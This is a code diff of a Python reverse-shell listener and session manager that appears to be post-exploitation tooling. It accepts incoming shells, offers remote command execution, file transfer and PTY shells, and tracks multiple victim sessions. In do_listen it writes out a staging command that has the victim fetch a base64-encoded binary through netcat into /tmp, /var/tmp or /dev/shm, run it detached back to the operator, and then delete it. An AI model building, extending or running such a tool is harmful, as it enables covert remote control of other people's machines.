@@ -1,132 +1,179 @@
-#!/usr/bin/python3
+#!python3
 
-from modules.utils import send_file, chk_payload
+from modules.utils import send_file, chk_payload, local_shell
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop, pretty, listen
+from modules.nethelper import pretty, PyServerSocket, BashServerSocket
+from modules.shell import RawShell
 from threading import Thread
+from modules.commands import ls
+
 import logging
-import socket
+import signal
+import rich
+import json
 import time
 import sys
 import cmd
 import os
 
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.DEBUG)
 sys.dont_write_bytecode = True
 PROJ_DIR = os.path.dirname(os.path.realpath(__file__))
+class Shell():
+    def __init__(self, socket):
+        self.socket = socket
+        self.session_type = "bash"
+        self.socket.is_open = True
+        self.is_bg = False
+
+class KeyboardBackground(Exception):
+    pass
 
 class NetShell(cmd.Cmd):
-    def __init__(self, server):
+    def __init__(self, socket):
         super(NetShell, self).__init__()
         self.prompt = "net_shell > "
-        self.server = server
+        self.socket = socket
         self.id = None
         self.output = None
-        self.is_open = True
-        self.is_loop = True
         self.shell_active = True
 
-        Thread(target=self._is_alive).start()
+        Thread(target=self.is_alive).start()
+
+
+    def default(self, line):
+        local_shell(line)
+
+    def emptyline(self):
+        """Called when an empty line is entered in response to the prompt.
+
+        If this method is not overridden, it repeats the last nonempty
+        command entered.
+        """
+        return None
 
     def precmd(self, line):
         """Hook method executed just before the command line is
         interpreted, but after the input prompt is generated and issued.
         """
-        if not self.is_open:
+        if not self.socket.is_open:
             raise BrokenPipeError
         return line
 
     def postcmd(self, stop, line):
         """Hook method executed just after a command dispatch is finished."""
-
         return stop
+
+    # Signal handling
+    def signal_handler(self, sig, frame):
+        """Handle received signals."""
+        if sig == signal.SIGINT:
+            sys.stdout.write("\n")
+            raise KeyboardInterrupt
+        elif sig == signal.SIGTSTP:
+            sys.stdout.write("\n")
+            raise KeyboardBackground
+
+    def cmdloop_with_sigint(self):
+        try:
+            signal.signal(signal.SIGINT, self.signal_handler)
+            signal.signal(signal.SIGTSTP, self.signal_handler)
+            self.cmdloop()
+        except KeyboardInterrupt:
+            self.cmdloop_with_sigint()
+        except KeyboardBackground:
+            an = input("Do you want to background this session? ")
+            if an.lower() == "y":
+                return False
+            elif an.lower() == "n":
+                self.cmdloop_with_sigint()
 
     """
         <--CMD library ends here-->
     """
 
-    def _is_alive(self):
-        while self.is_loop:
+    def is_alive(self):
+        while self.socket.is_open:
             try:
-                data = self.server.client_socket.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
+                data = self.socket.send_command("aliv")
                 if len(data) == 0:
-                    raise OSError
-            except BlockingIOError:
-                continue
-            except OSError as e:
-                if self.is_loop:
-                    logging.error(f"Session {self.id +1}: BrokenPipeError")
-                    self.is_open = False
-                    self.server.client_socket.close()
-                    self.server.server_socket.close()
-                    break
-            except Exception:
-                logging.error("unexpected exception when checking if a socket is closed")
+                    raise ConnectionError
+            except (BlockingIOError, AttributeError):
+                # This means the socket is still open but there's no data to receive
+                pass
+            except (ConnectionError, OSError, ValueError):
+                logging.error(f"Session {self.id +1}: Connection lost")
+                self.socket.is_open = False
+                self.socket.client_socket.close()
+                self.socket.server_socket.close()
                 break
-
-            time.sleep(1)
+            except Exception as e:
+                logging.error(f"Unexpected exception when checking if a socket is closed: {e}")
+                break
+            time.sleep(10)
 
     """
         <--Commands start here-->
     """
 
     def do_ls(self, line):
-        if not line:
-            path = pretty(self.server.send_command("pwd"))
-            ls = pretty(self.server.send_command("ls -la"))
-        else:
-            if line[0] == "-":
-                logging.error("um dont do that. placeholder text.")
-                return
-            ls = pretty(self.server.send_command(f"ls -la {line}"))
-            if "no such file or directory" in ls.lower():
-                logging.error("No such file or directory")
-                return
-            if line == "/":
-                path = "root folder"
-            else:
-                path = pretty(self.server.send_command(f"realpath {line}"))
+        try:
+            data = pretty(self.socket.send_command(f"ls {line}"))
+            ls(json.loads(data))
+        except BrokenPipeError:
+            self.do_exit("")
 
-        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n")
-    
-    def do_send(self, line):
-        check = self.server.send_command(f"sendingfile/{line}")
+    def do_alive(self, line):
+        print(pretty(self.socket.send_command("aliv")))
+
+    def do_send(self, line): # DOES NOT WORK
+        check = self.socket.send_command(f"sendingfile {line}")
         if b"ready" in check:
             with open(line, 'rb') as f:
                 while (chunk := f.read(1024)):
-                    self.server.client_socket.send(chunk)
+                    self.socket.client_socket.send(chunk)
 
     def do_get(self, line):
-        contents = pretty(self.server.send_command(f"gettingfile/{line}"))
+        contents = pretty(self.socket.send_command(f"gettingfile {line}"))
         if contents:
             with open(line.split("/")[-1], 'w') as f:
                 f.write(f"{contents}\n")
 
     def do_run(self, line):
-        self.output = pretty(self.server.send_command(line))
+        self.output = pretty(self.socket.send_command(line))
         if self.output:
             sys.stdout.write(f"{self.output}\n")
 
-    def do_cd(self, line): # BUG: Causes cryptography.exceptions.InvalidTag for some reason
-        self.output = pretty(self.server.send_command(f"cd {line}"))
+    def do_shell(self, line):
+        self.socket.send_command(f"shell")
+        with self.socket.lock:
+            RawShell(self.socket, pty=True).run()
+        return
+    
+    def do_cd(self, line):
+        self.output = pretty(self.socket.send_command(f"cd {line}"))
         if self.output:
             sys.stdout.write(f"{self.output}\n")
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
-
-        self.is_loop = False
-        self.server.client_socket.close()
-        self.server.server_socket.close()
+        self.is_bg = False
+        self.socket.is_open = False
+        self.socket.client_socket.close()
+        self.socket.server_socket.close()
         return True
 
 class LocalShell(cmd.Cmd):
     def __init__(self):
         super(LocalShell, self).__init__()
+        # Override cmdloop to handle keyboard interrupts
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTSTP, self.signal_handler)
+
         self.prompt = "local_shell > "
         self.sessions = []
-        self.currentSession = None
+        self.current_session = None
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
 
@@ -134,6 +181,8 @@ class LocalShell(cmd.Cmd):
             logging.warning('Warning: Binary file "payload" is not present.')
             chk_payload(PROJ_DIR)
 
+    def default(self, line):
+        local_shell(line)
 
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
@@ -149,50 +198,142 @@ class LocalShell(cmd.Cmd):
 
         return stop
 
+    # Signal handling
+    def signal_handler(self, sig, frame):
+        """Handle received signals."""
+        if sig == signal.SIGINT:
+            sys.stdout.write("\n")
+            raise KeyboardInterrupt
+        elif sig == signal.SIGTSTP:
+            print("\nCtrl+Z pressed. Type 'exit' to quit.")
+            raise KeyboardInterrupt
+
+    def cmdloop_with_sigint(self):
+        try:
+            self.cmdloop()
+        except (KeyboardInterrupt, BrokenPipeError):
+            self.cmdloop_with_sigint()
+        
     """
         <--Commands start here-->
     """
 
-    def do_listen(self, line):
-        if not line:
-            host, port = ("0.0.0.0", 4242)
-        else:
-            host, port = line.strip().split(" ")
+    def do_compile(self, line):
+        chk_payload(PROJ_DIR)
 
-        sock = listen(host, port, 0)
+    def do_listen(self, line):
+        host, port = ("0.0.0.0", 4242)
+        raw_shell = False
+
+        if line == "--raw":
+            raw_shell = True
+        else:
+            args = line.strip().split(" ")
+            if not line:
+                pass
+            elif len(args) < 2:
+                print("Error: Invalid input. Please enter in the format 'host port [optional_arg]'.")
+                return
+            elif len(args) == 2:
+                host, port = args
+            else:
+                if args[2] != "--raw":
+                    logging.error(f"error: unknown param {args[2]}")
+                    return
+                host, port, raw_shell = args[:3]
+
+            try:
+                port = int(port)
+            except ValueError:
+                print("Error: Invalid input. Port should be a number.")
+                return
+
+        sock = BashServerSocket()
+
+        try:
+            sock.server_socket.bind((host, int(port)))
+        except (OSError):
+            logging.error("Address already in use")
+            return
+
+        try:
+            sock.listen()
+            if not sock.is_shell():
+                logging.error("No shell found")
+                return
+        except (KeyboardInterrupt, BrokenPipeError) as e:
+            sock.server_socket.close()
+            if e == BrokenPipeError:
+                logging.error("BrokenPipeError")
+            return
+
         if not sock: return
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
 
-
         # TODO: Make it so that if there 
-        sock.sysinfo.is_nc = pretty(sock.send_command("which nc")) # This doesnt work
-        if sock.sysinfo.is_nc:
-            logging.info(f"Sending payload..")
+        sock.sysinfo.is_nc = pretty(sock.send_command("which nc"))
+        if not raw_shell:
+            try:
+                logging.info(f"Sending payload")
 
-            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
-                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
-                                            f"./payload {host} {port}'\n"\
-                                            .encode())
+                test = sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ; nc -lnp 1234 | base64 -d > payload ;\n".encode())
+                send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+                time.sleep(1)
+                test = pretty(sock.send_command("./payload --test"))
 
-            # TODO: add a check that confirms that netcat is running if not just skip 
-            sock.server_socket.close()
-            sock.client_socket.close()
-            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
-            logging.info(f"Payload sent. Starting listener..")
-            
-            sock = listen(host, port, 1)
-            if not sock: return
-            sock.send_command("rm -rf payload")
+                if not test == "Hello world! Wasd":
+                    logging.error("Thing did not run")
+                    raise Exception
+
+                sock.client_socket.send(f"setsid sh -c './payload --host {host} --port {port}'".encode())
+
+                sock.server_socket.close()
+                sock.client_socket.close()
+                logging.debug(f"Payload sent. Starting listener")
+
+                sock = PyServerSocket()
+
+                try:
+                    sock.server_socket.bind((host, int(port)))
+                except socket.error:
+                    logging.error("Address already in use")
+                    raise 
+
+                try:
+                    sock.listen()
+                    if not sock.is_shell():
+                        logging.error("No shell found")
+                        return
+                except KeyboardInterrupt:
+                    sock.server_socket.close()
+                    return
+                except BrokenPipeError:
+                    sock.server_socket.close()
+                    logging.error("BrokenPipeError")
+                    return
+
+                if not sock: return
+                sock.send_command("rm -rf payload")
+                self.current_session = NetShell(sock)
+                self.current_session.session_type = "python"
+            except Exception as e:
+                logging.error(f"Fail to initialize payload. {e}")
+                self.current_session = Shell(sock)
+                self.current_session.session_type = "bash"
         else:
-            logging.error("Fail to sent payload. Using shell as client.")
+            self.current_session = Shell(sock)
 
-        self.currentSession = NetShell(sock)
-
-        self.sessions.append(self.currentSession)
-        self.currentSession.id = (len(self.sessions) - 1)
-        logging.info(f"Session {self.currentSession.id + 1} created")
-        netshell_loop(self.currentSession)
+        self.sessions.append(self.current_session)
+        self.current_session.id = (len(self.sessions) - 1)
+        logging.info(f"Session {self.current_session.id + 1} created")
+        if self.current_session.session_type == "python":
+            self.current_session.cmdloop_with_sigint()
+            signal.signal(signal.SIGINT, self.signal_handler)
+            signal.signal(signal.SIGTSTP, self.signal_handler)
+        elif self.current_session.session_type == "bash":
+            RawShell(self.current_session.socket).run()
+            Thread(target=self.is_alive, args=[self.current_session]).start()
 
     def do_sessions(self, line):
         args = line.split(" ")
@@ -206,37 +347,40 @@ class LocalShell(cmd.Cmd):
                 if index > len(self.sessions):
                     logging.error("Sesssion not found")
                     return
-            netshell_loop(self.sessions[index -1])
+            session = self.sessions[index -1]
+            if not session.socket.is_open:
+                logging.error("Session is closed")
+            elif session.session_type == "python":
+                session.cmdloop_with_sigint()
+                signal.signal(signal.SIGINT, self.signal_handler)
+                signal.signal(signal.SIGTSTP, self.signal_handler)
+            elif session.session_type == "bash":
+                RawShell(session.socket).run()
+                
             return
 
-        for netShell in self.sessions:
+        for shell in self.sessions:
             # TODO: Format this
-            sys.stdout.write(f"Session {netShell.id +1} | IP address {netShell.server.client_address[0]} "
-                            f"| Port {netShell.server.server_socket.getsockname()[1]} | Open: {netShell.is_open}\n")
+            if shell.session_type == "python":
+                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.server_address} "
+                                f"| Port {shell.socket.server_port} | Open: {shell.socket.is_open}\n")
+            elif shell.session_type == "bash":
+                sys.stdout.write(f"Session {shell.id +1} | IP address {shell.socket.client_address[0]} "
+                                f"| Port {shell.socket.server_socket.getsockname()[1]} | Open: {shell.is_open}\n")
+
         sys.stdout.write("\n")
 
     def do_exit(self, line):
         logging.info("Exiting...")
 
         for netShell in self.sessions:
-            if netShell.is_open:
-                netShell.is_loop = False
-                netShell.server.client_socket.close()
-                netShell.server.server_socket.close()
+            if netShell.socket.is_open:
+                netShell.is_bg = False
+                netShell.socket.client_socket.close()
+                netShell.socket.server_socket.close()
 
         sys.exit()
 
 
-def _local_loop(localShell):
-    try:
-        localShell.cmdloop()
-    except KeyboardInterrupt:
-        print("")
-        _local_loop(localShell)
-
-def main():
-    _local_loop(LocalShell())
-
-
 if __name__ == "__main__":
-    main()
+    LocalShell().cmdloop_with_sigint()
